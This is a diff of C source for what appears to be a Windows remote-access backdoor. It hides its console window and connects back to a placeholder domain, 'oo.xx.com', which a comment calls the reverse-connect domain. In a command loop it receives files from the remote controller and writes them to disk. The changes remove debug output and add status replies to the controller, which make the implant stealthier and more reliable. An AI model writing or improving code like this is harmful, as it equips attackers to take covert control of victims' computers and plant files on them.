@@ -8,7 +8,6 @@
 #pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
 #endif
 
-
 #define MSG_LEN 1024
 
 char ServerAddr[] = "oo.xx.com"; //反弹连接的域名
@@ -55,26 +54,24 @@ int recvFile(SOCKET client, char *filename)
     HANDLE hFile;               // 文件句柄
     DWORD count;                // 写入的数据计数
  
-
-	printf("%s\n",filename);
-    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL);
+    hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_ARCHIVE, NULL);
 	if(hFile==INVALID_HANDLE_VALUE) {
 		return 1;
 	}
+	send(client,"BEGIN",6,0);
     while (1) {
         // 从客户端读数据
 		ZeroMemory(recvBuf, sizeof(recvBuf));   
 		len = recv(client, recvBuf, 1024, 0);
-		printf("%d\n",len);
         if (strlen(recvBuf) < 5) {
             if (strcmp(recvBuf, "EOF") == 0) {
                 CloseHandle(hFile);
                 break;
             }
-            WriteFile(hFile,recvBuf,len,&count,0);
 		}
+        WriteFile(hFile,recvBuf,len,&count,0);
     }
-
+	send(client,"RECV",5,0);
 	return 0;
 }
 
@@ -382,8 +379,7 @@ void c_socket()
 			ZeroMemory(recvCmd, sizeof(recvCmd));
 			recv(client, recvCmd, MSG_LEN, 0);
 			if(recvFile(client,recvCmd)){
-				printf("error");
-
+				send(client,"ERRO", 5, 0);
 			}
 			continue;
 		}else{
